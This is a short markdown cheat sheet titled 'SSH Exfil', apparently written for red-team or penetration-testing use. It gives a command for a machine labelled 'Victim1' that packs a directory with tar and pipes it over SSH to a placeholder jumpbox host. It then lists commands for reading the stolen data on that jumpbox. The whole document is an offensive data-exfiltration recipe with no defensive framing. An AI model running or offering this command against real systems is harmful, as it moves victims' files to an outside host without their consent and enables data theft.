# SSH Exfil

## Commands:

#### 1) Victim1: 

    tar cf - dir/ | ssh USER@JUMPBOX_IP

#### 2) Jumpbox: 

    cd /tmp/dir

    cat data.txt
